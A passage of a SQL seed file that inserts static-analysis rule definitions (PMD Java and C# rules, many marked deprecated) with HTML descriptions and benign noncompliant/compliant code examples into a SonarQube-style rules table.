INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (272, 'XPath rule template', 'XPathRule', 'net.sourceforge.pmd.lang.rule.XPathRule', 'pmd', 'PMD provides a very handy method for creating new rules by writing an XPath query. When the XPath query finds a match, a violation is created.
Let''s take a simple example: assume we have a Factory class that must be always declared final.
We''d like to report a violation each time a declaration of Factory is not declared final. Consider the following class:
<pre>
public class a {
  Factory f1;

  void myMethod() {
    Factory f2;
    int a;
  }
}
</pre>
The following expression does the magic we need:
<pre>
//VariableDeclarator
 [../Type/ReferenceType/ClassOrInterfaceType
  [@Image = ''Factory''] and ..[@Final=''false'']]
</pre>
See the <a href="http://pmd.sourceforge.net/xpathruletutorial.html" target="_blank">XPath rule tutorial</a> for more information.

<p>
This rule is deprecated, please see the documentation on <a href="http://docs.sonarqube.org/x/HQxR" target="_blank">Extending Coding Rules</a>.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, true, 'HTML', 1510817812007, 1510817812007, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (273, 'Avoid Duplicate Literals', 'AvoidDuplicateLiterals', 'rulesets/java/strings.xml/AvoidDuplicateLiterals', 'pmd', 'Code containing duplicate String literals can usually be improved by declaring the String as a constant field. Example :
<pre>
public class Foo {
 private void bar() {
    buz("Howdy");
    buz("Howdy");
    buz("Howdy");
    buz("Howdy");
 }
 private void buz(String x) {}
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1192} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812016, 1510817812016, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (274, 'Avoid Rethrowing Exception', 'AvoidRethrowingException', 'rulesets/java/strictexception.xml/AvoidRethrowingException', 'pmd', 'Catch blocks that merely rethrow a caught exception only add to code size and runtime complexity.

<p>
This rule is deprecated, use {rule:squid:S1166} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'error-handling', false, 'HTML', 1510817812022, 1510817812023, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (275, 'Avoid Constants Interface', 'AvoidConstantsInterface', 'rulesets/java/design.xml/AvoidConstantsInterface', 'pmd', 'An interface should be used only to model a behaviour of a class: using an interface as a container of constants is a poor usage pattern.

<p>
This rule is deprecated, use {rule:squid:S1214} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812024, 1510817812024, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (276, 'Unused formal parameter', 'UnusedFormalParameter', 'rulesets/java/unusedcode.xml/UnusedFormalParameter', 'pmd', '<p>Avoid passing parameters to methods or constructors and then not using those parameters.</p>

<p>
This rule is deprecated, use {rule:squid:S1172} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused-code', false, 'HTML', 1510817812027, 1510817812027, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (277, 'If a class implements Cloneable the return type of the method clone() must be the class name', 'CloneMethodReturnTypeMustMatchClassName', 'rulesets/java/clone.xml/CloneMethodReturnTypeMustMatchClassName', 'pmd', '<p>Minimum Language Version: java 1.5</p>
<p>
  If a class implements cloneable the return type of the method clone() must be the class name. That way, the caller of the clone method doesn’t need to cast the returned clone to the correct type.
</p>
<p>
  Note: This is only possible with Java 1.5 or higher.
</p>

<p>Examples:</p>
<pre>
public class Foo implements Cloneable {
    @Override
    protected Object clone() { // Violation, Object must be Foo
    }
}

public class Foo implements Cloneable {
    @Override
    public Foo clone() { //Ok
    }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812028, 1510817812029, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (278, 'Use Arrays As List', 'UseArraysAsList', 'rulesets/java/optimizations.xml/UseArraysAsList', 'pmd', 'The class java.util.Arrays has a asList method that should be use when you want to create a new List from an array of objects. It is faster than executing a loop to cpy all the elements of the array one by one', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812030, 1510817812030, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (279, 'Consecutive Appends Should Reuse', 'ConsecutiveAppendsShouldReuse', 'rulesets/java/strings.xml/ConsecutiveAppendsShouldReuse', 'pmd', 'Consecutively calls to StringBuffer/StringBuilder .append should reuse the target object. This can improve the performance. Example: 
<pre>
String foo = " ";

StringBuffer buf = new StringBuffer();
buf.append("Hello"); // poor
buf.append(foo);
buf.append("World");

StringBuffer buf = new StringBuffer();
buf.append("Hello").append(foo).append("World"); // good
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812031, 1510817812032, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (280, 'Compare Objects With Equals', 'CompareObjectsWithEquals', 'rulesets/java/design.xml/CompareObjectsWithEquals', 'pmd', 'Use equals() to compare object references; avoid comparing them with ==.

<p>
This rule is deprecated, use {rule:squid:S1698} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812033, 1510817812034, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (281, 'Empty Synchronized Block', 'EmptySynchronizedBlock', 'rulesets/java/empty.xml/EmptySynchronizedBlock', 'pmd', 'Avoid empty synchronized blocks - they''re useless.

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812035, 1510817812035, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (282, 'Avoid Enum As Identifier', 'AvoidEnumAsIdentifier', 'rulesets/java/migrating.xml/AvoidEnumAsIdentifier', 'pmd', 'Finds all places ''enum'' is used as an identifier is used.

<p>
This rule is deprecated, use {rule:squid:S1190} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812037, 1510817812037, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (283, 'Clone Throws Clone Not Supported Exception', 'CloneThrowsCloneNotSupportedException', 'rulesets/java/clone.xml/CloneThrowsCloneNotSupportedException', 'pmd', 'The method clone() should throw a CloneNotSupportedException.

<p>
This rule is deprecated, use {rule:squid:S1182} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812038, 1510817812039, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (284, 'Empty Statement Block', 'EmptyStatementBlock', 'rulesets/java/empty.xml/EmptyStatementBlock', 'pmd', 'Empty block statements serve no purpose and should be removed. Example: 
<pre>
public class Foo {

   private int _bar;

   public void setBar(int bar) {
      { _bar = bar; } // Why not?
      {} // But remove this.
   }

}
</pre>

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812040, 1510817812041, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (285, 'Too Many Static Imports', 'TooManyStaticImports', 'rulesets/java/imports.xml/TooManyStaticImports', 'pmd', 'If you overuse the static import feature, it can make your program unreadable and  unmaintainable, polluting its namespace with all the static members you import. Readers of your code (including you, a few months after you wrote it) will not know which class a static member comes from (Sun 1.5 Language Guide).', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, NULL, false, 'HTML', 1510817812042, 1510817812042, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (286, 'Unnecessary Local Before Return', 'UnnecessaryLocalBeforeReturn', 'rulesets/java/design.xml/UnnecessaryLocalBeforeReturn', 'pmd', 'Avoid unnecessarily creating local variables

<p>
This rule is deprecated, use {rule:squid:S1488} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812044, 1510817812045, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (287, 'Unnecessary Fully Qualified Name', 'UnnecessaryFullyQualifiedName', 'rulesets/java/imports.xml/UnnecessaryFullyQualifiedName', 'pmd', 'Import statements allow the use of non-fully qualified names.  The use of a fully qualified name
which is covered by an import statement is redundant.  Consider using the non-fully qualified name. Example: 
<pre>
import java.util.List;

public class Foo {
   private java.util.List list1; // Unnecessary FQN
   private List list2; // More appropriate given import of ''java.util.List''
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812046, 1510817812046, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (288, 'Use Array List Instead Of Vector', 'UseArrayListInsteadOfVector', 'rulesets/java/optimizations.xml/UseArrayListInsteadOfVector', 'pmd', 'ArrayList is a much better Collection implementation than Vector.

<p>
This rule is deprecated, use {rule:squid:S1149} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812047, 1510817812048, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (289, 'Equals Null', 'EqualsNull', 'rulesets/java/design.xml/EqualsNull', 'pmd', 'Inexperienced programmers sometimes confuse comparison concepts and use equals() to compare to null.

<p>
This rule is deprecated, use {rule:squid:S2159} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812048, 1510817812049, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (290, 'If Stmts Must Use Braces', 'IfStmtsMustUseBraces', 'rulesets/java/braces.xml/IfStmtsMustUseBraces', 'pmd', '<p>
Avoid using if statements without using curly braces.
</p>

<p>
This rule is deprecated, use {rule:squid:S00121} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812050, 1510817812051, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (291, 'Avoid Reassigning Parameters', 'AvoidReassigningParameters', 'rulesets/java/design.xml/AvoidReassigningParameters', 'pmd', 'Reassigning values to parameters is a questionable practice. Use a temporary local variable instead.

<p>
This rule is deprecated, use {rule:squid:S1226} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812051, 1510817812052, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (292, 'Close Resource', 'CloseResource', 'rulesets/java/design.xml/CloseResource', 'pmd', 'Ensure that resources (like Connection, Statement, and ResultSet objects) are always closed after use. It does this by looking for code patterned like :
<pre>
Connection c = openConnection();
try {
  // do stuff, and maybe catch something
} finally {
  c.close();
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S2095} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812055, 1510817812055, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (293, 'Excessive Public Count', 'ExcessivePublicCount', 'rulesets/java/codesize.xml/ExcessivePublicCount', 'pmd', 'A large number of public methods and attributes declared in a class can indicate the class may need to be broken up as increased effort will be required to thoroughly test it.

<p>
  This rule is deprecated, use {rule:squid:S1448} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817812061, 1510817812061, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (294, 'Naming - Avoid field name matching method name', 'AvoidFieldNameMatchingMethodName', 'rulesets/java/naming.xml/AvoidFieldNameMatchingMethodName', 'pmd', 'It is somewhat confusing to have a field name with the same name as a method. While this is totally legal, having information (field) and actions (method) is not clear naming. Example :
<pre>
public class Foo {
  Object bar;
  // bar is data or an action or both?
  void bar() {
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1845} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812063, 1510817812063, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (295, 'One Declaration Per Line', 'OneDeclarationPerLine', 'rulesets/java/controversial.xml/OneDeclarationPerLine', 'pmd', 'Java allows the use of several variables declaration of the same type on one line. However, it
can lead to quite messy code. This rule looks for several declarations on the same line. Example: 
<pre>
String name; // separate declarations
String lastname;

String name, lastname; // combined declaration, a violation
</pre>

<p>
  This rule is deprecated, use {rule:squid:S00122} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812064, 1510817812065, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (296, 'Finalize Does Not Call Super Finalize', 'FinalizeDoesNotCallSuperFinalize', 'rulesets/java/finalizers.xml/FinalizeDoesNotCallSuperFinalize', 'pmd', 'If the finalize() is implemented, its last action should be to call super.finalize.

<p>
This rule is deprecated, use {rule:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812066, 1510817812066, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (297, 'Package case', 'PackageCase', 'rulesets/java/naming.xml/PackageCase', 'pmd', 'Detects when a package definition contains upper case characters. Example :
<pre>
package com.MyCompany;  // <- should be lower case name
public class SomeClass {
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S00120} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812070, 1510817812070, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (298, 'Exceptions should not be thrown from property getters', 'S2372', NULL, 'csharpsquid', '<p>
    Property getters should be simple operations that are always safe to call. If exceptions need to be thrown, it is best to convert the property to a method.
</p>
<p>
    It is valid to throw exceptions from indexed property getters and from property setters, which are not detected by this rule.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
  public int Foo
  {
    get
    {
      throw new NotImplementedException();  //Non-Compliant
    }
    set
    {
      // ... some code ...
    }
  }
}
</pre>

<h2>Compliant Solution</h2>

<pre>
class MyClass
{
  public void SetFoo(int value)
  {
    // ... some code ...
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'error-handling', false, 'HTML', 1510817812077, 1510817812078, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (299, 'Literal suffixes should be upper case', 'S818', NULL, 'csharpsquid', '<p>
    Using upper case literal suffixes removes the potential ambiguity between "1" (digit 1) and "l" (letter el) for declaring literals.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
const uint a = 0u;      // Noncompliant
const long b = 0l;      // Noncompliant
const ulong c = 0Ul;     // Noncompliant
const ulong d = 0uL;     // Noncompliant
const decimal e = 1.2m;  // Noncompliant
const float f = 1.2f;    // Noncompliant
const double g = 1.2d;    // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
const uint a = 0U;
const long b = 0L;
const ulong c = 0UL;
const ulong d = 0UL;
const decimal e = 1.2M;
const float f = 1.2F;
const double g = 1.2D;
</pre>

<h2>See</h2>
<ul>
    <li>MISRA C++:2008, 2-13-4 - Literal suffixes shall be upper case</li>
    <li>MISRA C:2012, 7.3 - The lowercase character "l" shall not be used in a literal suffix</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/koAtAQ">CERT DCL16-C</a> - Use "L," not "l," to indicate a long value</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/n4AtAQ">CERT DCL16-CPP</a> - Use "L," not "l," to indicate a long value</li>
</ul>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,convention,misra,pitfall', false, 'HTML', 1510817812080, 1510817812081, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (302, 'Fields that are only assigned in the constructor should be "readonly"', 'S2933', NULL, 'csharpsquid', '<p>
    <code>readonly</code> fields can only be assigned in a class constructor. If a class has a field that''s
    not marked <code>readonly</code> but is only set in the constructor, it could cause confusion about the
    field''s intended use. To avoid confusion, such fields should be marked <code>readonly</code> to make their
    intended use explicit, and to prevent future maintainers from inadvertently changing their use.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class Person
{
  int _birthYear;  // Noncompliant
  Person(int birthYear)
  {
    _birthYear = birthYear;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class Person
{
  readonly int _birthYear;
  Person(int birthYear)
  {
    _birthYear = birthYear;
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'confusing', false, 'HTML', 1510817812088, 1510817812089, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (300, 'Classes with "IDisposable" members should implement "IDisposable"', 'S2931', NULL, 'csharpsquid', '<p>
    Classes with <code>IDisposable</code> members are responsible for cleaning up those members by calling
    their <code>Dispose</code> methods. The best practice here is for the owning class to itself implement
    <code>IDisposable</code> and call its members'' <code>Dispose</code> methods from its own
    <code>Dispose</code> method.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class ResourceHolder   // Noncompliant; doesn''t implement IDisposable
{
  private FileStream fs;  // This member is never Dispose''d
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }
  public void CloseResource()
  {
    this.fs.Close();
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class ResourceHolder : IDisposable
{
  private FileStream fs;
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }
  public void CloseResource()
  {
    this.fs.Close();
  }
  public void Dispose()
  {
    this.fs.Dispose();
  }
}
</pre>

<h2>See</h2>

<ul>
    <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cwe,denial-of-service', false, 'HTML', 1510817812083, 1510817812084, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (301, 'Property assignments should not be made for "readonly" fields not constrained to reference types', 'S2934', NULL, 'csharpsquid', '<p>
    While the properties of a <code>readonly</code> reference type field can still be changed after initialization,
    those of a <code>readonly</code> value field, such as a <code>struct</code>, cannot.
</p>
<p>
    If the member could be either a <code>class</code> or a <code>struct</code> then assignment to its properties
    could be unreliable, working sometimes but not others.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
interface IPoint
{
  int X { get; set; }
  int Y { get; set; }
}

class PointManager&lt;T&gt; where T: IPoint
{
